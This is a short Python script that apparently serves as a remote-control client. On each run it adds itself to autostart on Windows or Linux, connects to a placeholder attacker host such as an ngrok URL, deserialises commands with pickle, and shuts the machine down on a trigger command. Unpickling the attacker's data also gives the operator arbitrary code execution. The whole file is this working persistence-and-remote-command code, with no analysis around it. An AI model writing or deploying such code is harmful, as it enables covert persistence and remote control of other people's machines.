import socket
import pickle
import os
import shutil

HEADERSIZE = 10

def add_to_autostart():
    script_path = os.path.abspath(__file__)
    if os.name == 'nt':  # Windows
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        shutil.copy(script_path, startup_dir)
    elif os.name == 'posix':  # Linux
        autostart_dir = os.path.expanduser('~/.config/autostart')
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir)
        desktop_entry = f"""[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_US]=MyScript
Name=MyScript
Comment[en_US]=Start MyScript at login
Comment=Start MyScript at login
"""
        with open(os.path.join(autostart_dir, 'myscript.desktop'), 'w') as f:
            f.write(desktop_entry)

add_to_autostart()
print("Added to autostart")

# Replace with the public IP address or ngrok URL of the host machine
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('your_public_ip_or_ngrok_url', 1243))

while True:
    full_msg = b''
    new_msg = True
    while True:
        msg = s.recv(16)
        if new_msg:
            print("new msg len:", msg[:HEADERSIZE])
            msglen = int(msg[:HEADERSIZE])
            new_msg = False

        print(f"full message length: {msglen}")

        full_msg += msg

        print(len(full_msg))

        if len(full_msg) - HEADERSIZE == msglen:
            print("full msg recvd")
            command = pickle.loads(full_msg[HEADERSIZE:])
            print(command)
            if command == "123":
                if os.name == 'nt':  # Windows
                    os.system("shutdown /s /t 1")
                elif os.name == 'posix':  # Linux
                    os.system("shutdown now")
            new_msg = True
            full_msg = b""